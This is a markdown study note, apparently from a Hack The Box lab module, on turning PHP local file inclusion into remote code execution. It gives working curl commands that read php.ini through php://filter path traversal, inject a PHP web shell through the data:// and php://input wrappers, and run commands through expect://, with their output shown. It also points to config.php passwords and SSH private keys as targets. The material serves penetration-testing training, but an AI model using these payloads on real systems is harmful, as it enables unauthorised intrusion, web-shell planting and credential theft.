---
title: a-PHP Wrappers
draft: false
tags:
  - lfi
---
We may find the database password in a file like `config.php`.

We may check on `.ssh` directory and read `id_rsa` file to ssh-in to the system.

There are ways to achieve remote code execution directly through the vulnerable function without relying on data enumeration or local file privileges.

## Data

If `allow_url_include` setting is enabled on PHP, we can use data wrapper to include external data such as PHP code.

Let's check whether this is enabled by reading PHP config file.

## Check PHP Config

Where can we find PHP configuration file?

- On Apache - `/etc/php/X.Y/apache2/php.ini`
- On Nginx - `/etc/php/X.Y/fpm/php.ini`

Let's use `conver.base64-encode` filter along with cURL to read the config:

```shell-session
jadu101@htb[/htb]$ curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
<!DOCTYPE html>

<html lang="en">
...SNIP...
 <h2>Containers</h2>
    W1BIUF0KCjs7Ozs7Ozs7O
    ...SNIP...
    4KO2ZmaS5wcmVsb2FkPQo=
<p class="read-more">
```

Luckily, `allow_url_include` is enabled:

```shell-session
jadu101@htb[/htb]$ echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include

allow_url_include = On
```

Since this option is enabled, we can use the data wrapper.

## RCE

We will first base64 encode base PHP web shell:

```shell-session
jadu101@htb[/htb]$ echo '<?php system($_GET["cmd"]); ?>' | base64

PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
```

Now, we can URL encode the base64 string, and then pass it to the data wrapper with `data://text/plain;base64,`. Finally, we can use pass commands to the web shell with `&cmd=<COMMAND>`:

```shell-session
jadu101@htb[/htb]$ curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id' | grep uid
            uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Input

Similar to the `data` wrapper, the [input](https://www.php.net/manual/en/wrappers.php.php) wrapper can be used to include external input and execute PHP code.

For `input` wrapper, we have to pass our input as a POST request's data. So the vulnerable parameter must accept POST request for this attack to work.

Finally, the `input` wrapper also depends on the `allow_url_include` setting, as mentioned earlier.

```shell-session
jadu101@htb[/htb]$ curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid
            uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Expect

Finally, we may utilize the [expect](https://www.php.net/manual/en/wrappers.expect.php) wrapper, which allows us to directly run commands through URL streams.

However, expect is an external wrapper, so it needs to be manually installed and enabled on the back-end server.

Let's check whether it is installed by searching for keyword expect from the PHP config file:

```shell-session
jadu101@htb[/htb]$ echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep expect
extension=expect
```

To use the expect module, we can use the `expect://` wrapper and then pass the command we want to execute, as follows:

```shell-session
jadu101@htb[/htb]$ curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```